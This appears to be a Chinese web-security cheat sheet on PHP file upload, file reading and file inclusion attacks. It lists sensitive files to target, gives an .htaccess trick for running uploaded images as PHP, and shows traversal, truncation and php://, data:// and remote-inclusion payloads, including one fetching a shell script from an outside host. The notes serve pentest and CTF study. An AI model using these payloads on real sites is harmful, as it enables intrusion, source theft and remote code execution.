文件
================================

总体思路
--------------------------------
- 上传下载覆盖删除
    - move_uploaded_file
    - file_put_contents/file_get_contents
    - unlink
    - fopen/fgets
- 包含
    - LFI
        - 包含Web日志
        - 包含SSH日志
    - RFI
    - 全局找include, require
- 正常上传
    - 看上传是如何确定能否上传文件的



文件读取
--------------------------------
考虑读取可能有信息的文件

- 用户目录
    - .bash_history
    - .zsh_history
    - .profile
    - .bashrc
    - .gitconfig
    - .viminfo
    - passwd

- 配置文件
    - /etc/apache2/apache2.conf
    - /etc/nginx/nginx.conf

- 日志文件
    - /var/log/apache2/access.log
    - /var/log/nginx/access.log

- 站点目录
    - .svn/entries
    - .git/HEAD
    - WEB-INF/web.xml
    - .htaccess

- 特殊文件
    - .swp
    - .swo
    - .bak
    - index.php~
    - ...

- Python
    - ``__pycache__\__init__.cpython-35.pyc``


文件上传
--------------------------------
apache可根据是否允许重定向考虑上传.htacess
内容为

::
    
    AddType application/x-httpd-php .png
    php_flag engine 1

就可以用png或者其他后缀的文件做php脚本了

另外会解压上传的压缩包文件时，可以考虑上传含符号链接的文件


文件包含
--------------------------------

基础
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

基础包含

::
    
    <?php include("inc/" . $_GET['file']); ?>

考虑常用的三种包含方式

同目录包含

::

    file=.htaccess

目录遍历

::

    ?file=../../../../../../../../../var/lib/locate.db

日志注入

::

    ?file=../../../../../../../../../var/log/apache/error.log

绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
一般在文件包含之前，可能会调用file_exists，那么，如何对其进行绕过呢

1. 截断

1.1 %00截断

    几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。

1.2 长度截断

    Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

    msdn定义```#define MAX_PATH 260```，第260个字符为字符串结尾的```\0```

    linux可以用getconf来判断文件名长度限制和文件路径长度限制

    获取最长文件路径长度：getconf PATH_MAX /root 得到4096
    获取最长文件名：getconf NAME_MAX /root 得到255

    那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉

2. 伪协议绕过
    - RCE: requires allow_url_fopen=On and allow_url_include=On
    
    ::

        ?file=[http|https|ftp]://websec.wordpress.com/shell.txt

    - PHP INPUT: specify your payload in the POST parameters, watch urlencoding, details here, requires allow_url_include=On

    ::

        ?file=php://input

    
    - BASE64: lets you read PHP source because it wont get evaluated in base64. More details here and here

    ::

        ?file=php://filter/convert.base64-encode/resource=index.php

    
    - DATA: requires allow_url_include=On

    ::

        ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=


3. url绕过
4. 特殊字符绕过

